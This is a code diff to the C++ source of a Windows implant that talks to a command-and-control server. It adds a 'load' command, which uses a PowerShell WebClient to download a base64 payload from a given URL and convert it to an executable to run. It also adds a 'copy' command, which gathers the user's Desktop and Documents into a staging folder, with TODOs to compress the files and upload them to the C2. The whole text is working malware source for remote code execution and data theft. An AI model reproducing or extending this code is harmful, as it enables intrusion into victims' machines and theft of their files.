@@ -50,6 +50,9 @@ int setupDirectory();
 int setupPersist();
 void createFileFromBase64String(char *filename);
 int runScript(char *file_source, char *file_output);
+int downloadFile(string url, string destName);
+void copyData();
+vector<string> makeTargetPaths();
 
 const string c2_id = "6969";
 const string stunServer = "stun:stun.l.google.com:19302";
@@ -229,6 +232,7 @@ string parseMessage(string message) {
 	string cmd4 = "load";        // Loads a given file (base64 format)
 	string cmd5 = "cmd";
 	string cmd6 = "video";
+	string cmd7 = "copy";
 
 	/***
 	 * list-implants | List the implants connected on the network.
@@ -269,23 +273,12 @@ string parseMessage(string message) {
 	} else if (strncmp(message.c_str(), cmd4.c_str(), cmd4.size()) == 0) {
 		char *filename = "prueba.txt";
 		cout << "RECEIVED DATA" << endl;
-		string numberStr = message.substr(message.find(":") + 1,
-		                                  message.find("::") +
-		                                      1); // Number of messages to retrieve in base64 string
-		int number = stoi(numberStr);
-		string data = message.substr(message.find("::") + 2); // Actual string
-		cout << number << endl;
-		if (number == 0) { // Create new file
-			std::ofstream outfile(filename);
-			outfile << data;
-			outfile.close();
-		} else { // Append
-			std::ofstream outfile;
-			outfile.open(filename, std::ios_base::app);
-			outfile << data;
-			outfile.close();
-			
-		}
+
+		string data = message.substr(message.find(":") + 1);
+		downloadFile(data, "st.txt");
+		Sleep(5000);
+		createFileFromBase64String("st.txt");
+		return "COMPLETED";
 	
 	/***
 	* cmd (Powershell) | Runs the given command in powershell
@@ -315,7 +308,6 @@ string parseMessage(string message) {
 		             "System.Net.WebClient;\n$WebClient.DownloadFile($V,$D);" +
 		             data_directory + "\\v.mp4;";
 
-
 		LPSTR cmd_s = const_cast<char *>(cmd.c_str());
 		LPSTR cmd2_s = const_cast<char *>(cmd2.c_str());
 
@@ -323,6 +315,16 @@ string parseMessage(string message) {
 		PROCESS_INFORMATION processInfo;
 		CreateProcess(NULL, cmd_s, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
 
+		return "COMPLETED";
+
+	/***
+	* copy | Copies main folders and files to a new directory
+	*		 Compresses the documents
+	*		 Uploads compressed file to C2
+	***/
+	} else if (strncmp(message.c_str(), cmd7.c_str(), cmd7.size()) == 0) {
+		copyData();
+		//TODO: Compress data & Upload data
 		return "COMPLETED";
 	} else
 		cout << message << endl;
@@ -332,12 +334,63 @@ string parseMessage(string message) {
 
 
 /***
+* copyData | Finds and copies all the main user files and folders to a single directory
+***/
+void copyData() { 
+	// TODO: Avoid files with extensions in ignoreExt
+	string target = data_directory + "\\backup";
+	vector<string> ignoreExt = {".exe", ".lnk", ".ini"};
+
+	vector<string> dirTargets = makeTargetPaths();
+
+	//Create folder if it doesnt exist
+	if (GetFileAttributes(target.c_str()) == INVALID_FILE_ATTRIBUTES) {
+		filesystem::create_directories(target.c_str());
+	}
+
+	for (int i = 0; i < dirTargets.size(); i++) {
+		std::string path = dirTargets[i];
+		
+		copyRecursive(path, target);
+	}
+}
+
+
+vector<string> makeTargetPaths() { 
+	vector<string> l;
+	l.push_back(user_directory + "\\Desktop");
+	l.push_back(user_directory + "\\Documents");
+	//l.push_back(user_directory + "\\Pictures");
+	//l.push_back(user_directory + "\\Downloads");
+
+	//TODO : Make a tree iterator algorithm to analyze every folder
+	return l;
+}
+    /***
+* downloadFile | Downloads a file to the data directory
+***/
+int downloadFile(string url, string destName) {
+
+	string cmd = "powershell.exe $URL = '" + url + "';\n$D = '" + data_directory + "\\" + destName +
+	             "';\n$WebClient = New-Object System.Net.WebClient;\n$WebClient.DownloadFile($URL,$D);";
+
+	LPSTR cmd_s = const_cast<char *>(cmd.c_str());
+
+	STARTUPINFO info = {sizeof(info)};
+	PROCESS_INFORMATION processInfo;
+	CreateProcess(NULL, cmd_s, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+	return 1;
+}
+
+/***
  * createFileFromBase | Creates a binary from a base64 string and runs it
  ***/
 void createFileFromBase64String(char *filename) {
 
 	string destName = std::regex_replace(filename, std::regex(".txt"), ".exe");
 	string logName = std::regex_replace(filename, std::regex(".txt"), "-log.txt");
+	cout << destName << endl;
+	cout << logName << endl;
 
 	STARTUPINFO info = {sizeof(info)};
 	PROCESS_INFORMATION processInfo;
